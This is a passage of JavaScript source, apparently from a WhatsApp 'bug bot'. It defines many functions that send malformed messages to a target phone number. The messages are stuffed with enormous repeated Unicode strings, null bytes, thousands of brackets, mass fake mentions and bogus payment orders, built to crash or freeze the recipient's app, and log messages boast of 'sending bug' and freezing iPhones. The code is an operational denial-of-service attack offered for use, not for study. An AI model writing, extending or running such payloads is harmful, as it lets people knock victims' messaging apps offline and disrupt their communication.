          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const AudioVs = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 99999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  )
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363375427625764@newsletter",
                  serverMessageId: 1,
                  newsletterName: ""
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==" //Jagan di ubah
            }
          }
        }
      }
    };
  
  const msg = generateWAMessageFromContent(X, msgg, message2, AudioVs, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(X, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}



async function Dandelion(X) {
  try {
    const dandelion = 'ោ៝'.repeat(3000);
    const jawa = 'ꦾ'.repeat(3000);
    const jawir = 'ꦾ'.repeat(3000);

    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1234567891234@newsletter",
        newsletterName: "dandelion" + dandelion,
        caption: "crot" + jawa + jawir,
        inviteExpiration: "90000",
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
        },
      },
    };

    await sock.relayMessage(X, msg, {
      participant: { jid: X },
      messageId: null,
    });

    console.log(chalk.red.bold(`Succes Sending Force/Lose To X ${X}`));
  } catch (err) {
    console.error("Gagal Mengirim Bug", err);
  }
}



async function rimps(X, sock) {
  try {
    if (!sock) throw new Error("Sock undefined: koneksi belum aktif!");

    // Ambil thumbnail
    const { data } = await axios.get("https://files.catbox.moe/i236nc.png", {
      responseType: "arraybuffer"
    });
    const thumb = Buffer.from(data, "binary");

    // Pesan interaktif
    const msg = {
      interactiveMessage: {
        header: {
          hasMediaAttachment: true,
          jpegThumbnail: thumb
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: { value: 49981399788, offset: 100 },
                reference_id: "4OON4PX3FFJ",
                type: "physical-goods",
                order: {
                  status: "payment_requested",
                  subtotal: { value: 49069994400, offset: 100 },
                  tax: { value: 490699944, offset: 100 },
                  discount: { value: 485792999999, offset: 100 },
                  shipping: { value: 48999999900, offset: 100 },
                  order_type: "ORDER",
                  items: [
                    {
                      retailer_id: "7842674605763435",
                      product_id: "7842674605763435",
                      name: "️VinzaIs1st",
                      amount: { value: 9999900, offset: 100 },
                      quantity: 7
                    },
                    {
                      retailer_id: "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8",
                      name: "",
                      amount: { value: 999999900, offset: 100 },
                      quantity: 49
                    }
                  ]
                },
                native_payment_methods: []
              })
            }
          ]
        }
      }
    };

    // Kirim pesan pakai sendMessage (lebih stabil)
    await sock.sendMessage(X, msg);

    console.log("✅ Pesan berhasil dikirim ke:", X);
  } catch (err) {
    console.error("❌ Gagal kirim:", err.message);
  }
}

async function JandaMuda(sock, X) {
console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const cardss = [];

  for (let i = 0; i < 20; i++) {
    cardss.push({
      header: {
        hasMediaAttachment: true,
        productMessage: {
          product: {
            productImage: {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
    fileLength: "999999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
    fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
    directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1755695348",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
  },
            productId: "9783476898425051",
            title: "σƭαא ɦεɾε" + "ꦽ".repeat(500),
            description: "ꦽ".repeat(500),
            currencyCode: "IDR",
            priceAmount1000: "X",
            retailerId: "BAN011",
            productImageCount: 2,
            salePriceAmount1000: "50000000"
          },
          businessOwnerJid: "6287875400190@s.whatsapp.net",     
        }
      },
      body: { text: "LOVE U" + "ꦽ".repeat(5000) },
      nativeFlowMessage: {
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "RIVIEW",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "PROMOTION",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "DOCUMENT",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          }
        ],
        messageParamsJson: "{[".repeat(10000)
      }
    });
  }

  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
        contextInfo: {
            participant: X,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "X",
            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
              }
            }
          },
          carouselMessage: {
            messageVersion: 1,
            cards: cardss
          }
        }
      }
    }
  };

  const [janda1, janda2] = await Promise.all([
    sock.relayMessage(X, content, {
      messageId: "",
      participant: { jid: X },
      userJid: X
    }),
    sock.relayMessage(X, content, {
      messageId: "",
      participant: { jid: X },
      userJid: X
    })
  ]);
    await sleep(1500);
}


async function XStromDelayNative(X, mention) {
    console.log(chalk.red(`Succes Sending Bug DelayInvisibleNative`));
    let message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "@zyyimupp Here Bro!!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1000000),
              version: 2
            },
          },
        },
      },
    };
    
    const msg = generateWAMessageFromContent(X, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      X,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function QueenSqL(X) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];
  let msg = generateWAMessageFromContent(X, {
    interactiveMessage: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageAssociation: {
          associationType: 2,
          parentMessageKey: crypto.randomBytes(16)
        }, 
        messageSecret: crypto.randomBytes(32),
        supportPayload: JSON.stringify({
          version: 2,
          is_ai_message: true,
          should_show_system_message: true,
          ticket_id: crypto.randomBytes(16)
        })
      },
      contextInfo: {
        mentionedJid: [X, ...Array.from({ length: 1999 }, (_, y) => `13135550002@s.whatsapp.net`)], 
        expiration: -9999, 
        ephemeralSettingTimestamp: 9741,
        disappearingMode: {
          initiator: "INITIATED_BY_OTHER",
          trigger: "ACCOUNT_SETTING"
        }, 
        isForwarded: true, 
        forwardingScore: 1972,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        }, 
        quotedMessage: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
              title: "D | 7eppeli-Exploration"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(9000), 
              buttons: [
                {
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
                }
              ], 
              messageParamsJson: "}".repeat(9000)
            }
          }
        }
      },
      header: {
        hasMediaAttachment: true, 
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0
        }
      }, 
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
          }
        ],
        messageParamsJson: "{".repeat(1000) + "}".repeat(1000)
      }, 
      annotations: [
        {
          embeddedContent: {
            embeddedMessage: {
              message: "D | 7eppeli-Exploration"
            }
          }, 
          location: {
            degreesLongitude: 0,
            degreesLatitude: 0,
            name: "D | 7eppeli-Exploration"
          }, 
          polygonVertices: [
            { x: 60.71664810180664, y: -36.39784622192383 },
            { x: -16.710189819335938, y: 49.263675689697266 },
            { x: -56.585853576660156, y: 37.85963439941406 },
            { x: 20.840980529785156, y: -47.80188751220703 }
          ],
          newsletter: {
            newsletterJid: "1@newsletter",
            newsletterName: "D | 7eppeli-Information",
            contentType: "UPDATE",
            accessibilityText: "https://7eppeli-Yuukey.site"
          }
        }
      ]
    }
  }, { userJid:X });
  
  await sock.relayMessage(X, msg.message, {
    participant: { jid:X }, 
    messageId: msg.key.id, 
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "9",
              name: "payment_method"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  }) 
}


async function QueenFlows(X) {
  const msg = await generateWAMessageFromContent(X,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { 
              title: "", 
              hasMediaAttachment: false 
            },
            body: { 
              text: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>" 
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { 
                  name: "single_select", 
                  buttonParamsJson: JSON.stringify({ status: true })
                },
                { 
                  name: "call_permission_request", 
                  buttonParamsJson: JSON.stringify({ status: true })
                },
                {
                  name: "mpm", 
                  buttonParamsJson: ""
                }, 
                {
                  name: "mpm", 
                  buttonParamsJson: ""
                }
              ],
            },
            contextInfo: {
              remoteJid: "status@broadcast",
              participant: X,
              forwardingScore: 250208,
              isForwarded: false,
              mentionedJid: [X, "13135550002@s.whatsapp.net"]
            },
          },
        },
      },
    }, {});

  await sock.relayMessage(X, msg.message, {
    participant: { jid: X },
    messageId: msg.key.id
  });
  await sleep(1);
  await sock.sendMessage(X, { delete:msg.key });
}

async function InvisXUi(X) {
  const AzzCrow = "𑇂AzzCrowi𑆵𑆴𑆿".repeat(60000);
  const mentionedList = [
    X, ...Array.from({ length: 35000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".AzzCrow" + "ោ៝".repeat(10000),
    title: "Crow Invisible",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const permission = await generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: AzzCrow },
          nativeFlowResponseMessage: {
            name: "invisible_crow",
            paramsJson: JSON.stringify(embeddedMusic),
            version: 1
          }
        },
        contextInfo: {
          mentionedJid: mentionedList,
          ephemeralExpiration: 0,
          forwardingScore: 0,
          isForwarded: false,
          font: Math.floor(Math.random() * 9),
          background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        }
      }
    }
  });

  await sock.relayMessage("status@broadcast", permission.message, {
    messageId: permission.key.id,
    statusJidList: [X],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: X }, 
          content: undefined
        }]
      }]
    }]
  });

  console.log(chalk.blue('MAMPUS KENA INVIS CROW INVISIBLE SEND BUG'));
}

async function mkkll(sock, X) {
  const rimuru = {
    key: {
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast"
    },
    message: {
      interactiveMessage: {
        header: {
          hasMediaAttachment: true,
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k="
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: { value: 49981399788, offset: 100 },
                reference_id: "4OON4PX3FFJ",
                type: "physical-goods",
                order: {
                  status: "payment_requested",
                  subtotal: { value: 49069994400, offset: 100 },
                  tax: { value: 490699944, offset: 100 },
                  discount: { value: 485792999999, offset: 100 },
                  shipping: { value: 48999999900, offset: 100 },
                  order_type: "ORDER",
                  items: [
                    {
                      retailer_id: "7842674605763435",
                      product_id: "7842674605763435",
                      name: "️VinzaIs1st",
                      amount: { value: 9999900, offset: 100 },
                      quantity: 7
                    },
                    {
                      retailer_id:
                        "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8",
                      name: "",
                      amount: { value: 999999900, offset: 100 },
                      quantity: 49
                    }
                  ]
                },
                native_payment_methods: []
              })
            }
          ]
        }
      }
    }
  };

  const message1 = {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "rimXs-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(90000)
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 9000 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],
        annotations: [
          {
            embeddedContent: X,
            embeddedAction: true
          }
        ]
      }
    }
  };

  await sock.relayMessage(X, { ...rimuru.message, ...message1 }, {});

  console.log("send bug to", X);
}
  

async function freezeIphone(X) {
console.log(chalk.red.bold("succes send bug blank by Vortunix"))
sock.relayMessage(
X,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: X,
      participant: X,
      quotedMessage: {
        conversation: "On? Jawab Bang Mau Mc" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: X,
  },
},
{
  messageId: null,
}
);
}

async function XtravsBulldozerX(X, mention) {
  const mentionedJidList = [ "0@s.whatsapp.net", ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  ];
  
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: X,
          mentionedJid: mentionedJidList,
         quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };
  
  const message2 = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            participant: X,
            mentionedJid: mentionedJidList,
            isSampled: true,
            participant: X,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };
  
  const message3 = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: mentionedJidList,
      }
    }
  };
  
  const msg = generateWAMessageFromContent(X, message1, message2, message3, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      X, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

//Tryy aja kidsss
//created by rimuru
async function blankk(sock, X) {
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  try {
    const msg1 = generateWAMessageFromContent(X, {
      groupInviteMessage: {
        groupJid: "120363370626418572@g.us",
        inviteCode: "sockXS",
        inviteExpiration: "99999999999",
        groupName: "⎋Traz MobaX🌹‌‌" + "ោ៝".repeat(7777),
        caption: "ោ៝".repeat(10000) + "Waterpak".repeat(9000) + "._.*_*._>".repeat(5000),
        contentText: "ꦾ".repeat(9000),
        displayText: "ꦾ".repeat(9000),
        contextInfo: {
          mentionedJid: [
            X,
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            ),
          ],
          expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: X,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS",
          },
          participant: X,
          remoteJid: X,
          questionMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null,
            },
          },
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: true,
          },
        },
        body: {
          text:
            "⎋Traz MobaX🌹‌‌" +
            "ꦾ".repeat(10450) +
            "Traz MobaX🌹‌‌" +
